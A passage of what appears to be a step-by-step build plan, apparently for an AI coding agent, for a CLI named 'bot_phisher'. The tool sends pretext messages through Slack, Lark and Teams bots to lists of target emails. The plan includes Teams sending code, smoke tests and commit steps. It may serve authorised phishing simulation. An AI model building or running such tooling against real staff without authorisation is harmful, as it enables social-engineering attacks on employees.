            message = questionary.text("Message text:").ask()
            if not message:
                continue

            source = pick_targets_source()
            if source == "Enter single email":
                email = questionary.text(
                    "Enter target email:"
                ).ask()
                if not email:
                    continue
                emails = [email]
            else:
                emails = load_targets()

            if not confirm_send(
                "Teams", "send_message", entry["name"],
                emails, message,
            ):
                continue

            for email in emails:
                ok, detail = send_message_to_user(
                    bot_token, graph_token, client_id,
                    tenant_id, email, message,
                )
                log_result(
                    "teams", "send_message", entry["name"],
                    email, "success" if ok else "failure", detail,
                )
```

**Step 3: Commit**

```bash
git add bot_phisher/teams/
git commit -m "feat: add Teams message sending, validation, and Graph enumeration"
```

---

### Task 12: Integration Test — End-to-End Smoke Test

**Step 1: Verify the full CLI starts and menus render**

Run: `python -m bot_phisher`

Expected: Banner prints, platform selection menu appears. Selecting "Exit" exits cleanly.

**Step 2: Verify each platform errors gracefully with no config**

Create a minimal `config.yaml` with empty platform sections:

```yaml
slack: []
lark: []
teams: []
```

Run `python -m bot_phisher`, select each platform, verify "No credentials" message appears.

**Step 3: Verify Lark card listing works**

Run: `python -c "from bot_phisher.lark.actions import list_cards; print(list_cards())"`
Expected: list of `.json` filenames from `pretexts/`

**Step 4: Verify all imports resolve**

```bash
python -c "
from bot_phisher.core.cli import main
from bot_phisher.core.config import load_config
from bot_phisher.core.logger import log_result, log_info
from bot_phisher.core.targets import load_targets
from bot_phisher.slack.auth import check_permissions
from bot_phisher.slack.actions import send_message
from bot_phisher.lark.auth import get_tenant_token
from bot_phisher.lark.actions import send_card
from bot_phisher.teams.auth import get_bot_token
from bot_phisher.teams.actions import send_message_to_user
print('All imports OK')
"
```

**Step 5: Commit any fixes**

```bash
git add -A
git commit -m "fix: resolve integration issues from smoke testing"
```

---

### Task 13: Update CLAUDE.md and Documentation

**Files:**
- Modify: `CLAUDE.md`

**Step 1: Update CLAUDE.md to reflect the new unified tool**

Add the new entry point, config format, and project structure. Keep the legacy tool documentation for reference.

**Step 2: Commit**

```bash
git add CLAUDE.md
git commit -m "docs: update CLAUDE.md for unified bot-phisher CLI"
```
